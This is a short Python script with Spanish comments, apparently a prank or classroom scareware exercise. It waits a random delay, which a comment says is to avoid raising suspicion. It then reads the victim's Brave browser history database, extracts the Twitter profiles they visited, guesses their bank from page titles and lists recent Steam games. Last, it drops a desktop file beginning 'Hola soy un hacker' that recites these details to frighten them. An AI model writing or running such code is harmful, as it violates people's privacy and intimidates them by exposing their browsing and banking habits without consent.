import os
from pathlib import Path
from shutil import copyfile
from time import sleep
from random import randrange
import sqlite3
import re
import glob

HACKER_FILE_NAME = "PARA TI.txt"


def get_user_path():
    return "{}/".format(Path.home())  # devuelve el path principal del usuario


def check_steam_games(hacker_file):
    steam_path = "C:\\Program Files (x86)\\Steam\\steamapps\\common\\*"
    games = []
    game_paths = glob.glob(steam_path)
    game_paths.sort(key=os.path.getmtime, reverse=True)
    for game_path in game_paths:
        games.append(game_path.split("\\")[-1])
    hacker_file.write("he visto que has estado jugando ultimamente a {}...".format(", ".join(games[:3])))


def delay_action():
    n_hours = randrange(1, 4)
    print("Durmiendo {} horas".format(n_hours))
    sleep(n_hours)  # por 60 min por 60 seg


def create_hacker_file(user_path):
    hacker_file = open(user_path + "OneDrive - Pontificia Universidad Javeriana/Desktop/" + HACKER_FILE_NAME, "w")
    hacker_file.write("Hola soy un hacker y me he colado en tu sistema...\n")
    return hacker_file


def get_brave_history(user_path):
    urls = None
    while not urls:
        try:
            history_path = user_path + "/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/History"
            temp_history = history_path + "temp"
            copyfile(history_path, temp_history)
            connection = sqlite3.connect(history_path)
            cursor = connection.cursor()
            cursor.execute("SELECT title, last_visit_time, url FROM urls ORDER BY last_visit_time DESC")
            urls = cursor.fetchall()
            connection.close()
            return urls
        except sqlite3.OperationalError:
            print("La base de datos esta abierta")
            sleep(3)


def check_twitter_profile_scare_user(hacker_file, brave_history):
    profiles_visited = []
    for item in brave_history:
        results = re.findall("https://twitter.com/([A-Za-z0-9]+)$", item[2])
        if results and results[0] not in ["notifications", "home", "login"]:
            profiles_visited.append(results[0])
    hacker_file.write("he visto que has estado husmeando en los perfiles de "
                      "{}...".format(", ".join(profiles_visited[:4])))


def check_bank_account(hacker_file, brave_history):
    his_bank = None
    banks = ["bancolombia", "davivienda", "colpatria", "santander", "itau"]
    for item in brave_history:
        for b in banks:
            if b.lower() in item[0].lower():
                his_bank = b
                break
        if his_bank:
            break
    hacker_file.write("\nademas veo que guardas tu dinero en {}... interesante.\n".format(his_bank))


def main():
    # se espera entre 1 y 3 horas para no levantar sospechas
    delay_action()
    # Calculamos la ruta del usuario de windows
    user_path = get_user_path()
    # Recogemos Historial cuando sea posible
    brave_history = get_brave_history(user_path)
    # Creamos archivo en escritorio
    hacker_file = create_hacker_file(user_path)
    # escribiendo mensajes de miedo
    check_twitter_profile_scare_user(hacker_file, brave_history)
    check_bank_account(hacker_file, brave_history)
    check_steam_games(hacker_file)


if __name__ == "__main__":
    main()
